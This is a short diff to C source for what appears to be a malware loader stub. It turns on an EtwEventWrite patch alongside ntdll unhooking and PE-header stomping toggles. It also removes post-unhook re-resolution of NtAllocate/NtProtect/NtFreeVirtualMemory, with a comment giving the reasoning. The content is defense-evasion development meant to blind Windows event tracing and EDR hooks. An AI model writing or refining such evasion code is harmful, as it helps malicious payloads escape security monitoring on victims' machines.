@@ -31,7 +31,7 @@
 /* ─── Evasion toggles: enable one at a time to isolate issues ─── */
 #define EVASION_STOMP   1   /* MZ/PE signature stomp in _load_pe       */
 #define EVASION_UNHOOK  1   /* ntdll .text unhooking                   */
-#define EVASION_ETW     0   /* EtwEventWrite patch — DISABLED to test  */
+#define EVASION_ETW     1   /* EtwEventWrite patch                     */
 
 /* Legacy macro — leave at 0, individual toggles above take over */
 #define STUB_EVASION_ENABLED 0
@@ -1247,14 +1247,11 @@ void _stub_entry(void) {
 #if EVASION_ETW
             _patch_etw(k32, ntdll);
 #endif
-            /* Re-resolve Nt* from the now-clean ntdll */
-            api.pNtAllocateVirtualMemory = (fnNtAllocateVirtualMemory_t)
-                _resolve_export(ntdll, H_NtAllocateVirtualMemory);
-            api.pNtProtectVirtualMemory = (fnNtProtectVirtualMemory_t)
-                _resolve_export(ntdll, H_NtProtectVirtualMemory);
-            api.pNtFreeVirtualMemory = (fnNtFreeVirtualMemory_t)
-                _resolve_export(ntdll, H_NtFreeVirtualMemory);
-            SLOG("[stub] Nt* re-resolved after unhook/etw");
+            /* NOTE: re-resolution removed — unhooking changes the CODE at
+             * the function address, not the export table.  The pointers
+             * from _resolve_apis() already point to the right addresses;
+             * the bytes there are now clean. */
+            SLOG("[stub] unhook/etw done");
         }
     }
 #else
